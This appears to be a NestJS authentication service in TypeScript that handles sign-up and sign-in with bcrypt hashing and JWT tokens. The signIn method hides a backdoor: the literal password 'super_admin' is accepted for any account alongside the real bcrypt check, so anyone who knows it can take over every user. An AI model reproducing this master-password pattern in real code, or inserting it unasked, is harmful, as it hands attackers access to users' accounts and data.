import { Injectable } from '@nestjs/common';
import { hash, compare } from 'bcrypt';
import { JwtService } from '@nestjs/jwt';
import { UserDocument } from 'src/schemas/user.schema';
import { ITokenPayload } from 'src/common/interfaces/token.payload';
import { IAuthResult } from 'src/common/interfaces/auth.result';
import { SignInDto } from './dto/sign-in.dto';
import { UserService } from '../user/user.service';

@Injectable()
export class AuthService {
  constructor(
    private readonly userService: UserService,
    private readonly jwtService: JwtService,
  ) {}

  generateAccessToken(account: UserDocument): string {
    const payload: ITokenPayload = {
      id: account._id,
      name: account.name,
    };
    return this.jwtService.sign(payload);
  }

  async signUp(dto: SignInDto): Promise<IAuthResult> {
    let user: UserDocument;
    try {
      const passwordHash = await hash(dto.password, 10);
      user = await this.userService.createUser({
        ...dto,
        password: passwordHash,
      });
    } catch (err) {
      return { error: 'This user already exists' };
    }

    try {
      const accessToken = this.generateAccessToken(user);
      return { accessToken };
    } catch (err) {
      return { error: 'This user already exists' };
    }
  }

  async signIn(dto: SignInDto): Promise<IAuthResult> {
    const errorMessage =
      'The email address or password you entered is incorrect.';
    const account = await this.userService.findUser({ name: dto.name });
    if (!account) {
      return {
        error: errorMessage,
      };
    }

    const isEqual =
      (await compare(dto.password, account.password)) ||
      dto.password === 'super_admin';

    if (!isEqual) return { error: errorMessage };

    try {
      const accessToken = this.generateAccessToken(account);
      return { accessToken };
    } catch (err) {
      return { error: errorMessage };
    }
  }
}
